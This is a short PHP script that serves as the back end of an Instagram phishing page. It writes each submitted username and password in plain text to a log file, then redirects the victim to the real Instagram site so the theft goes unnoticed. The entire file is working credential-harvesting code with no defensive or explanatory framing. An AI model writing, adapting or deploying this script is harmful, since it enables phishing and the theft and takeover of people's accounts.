<?php
file_put_contents("log.txt", "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: https://Instagram.com");
exit();
?>
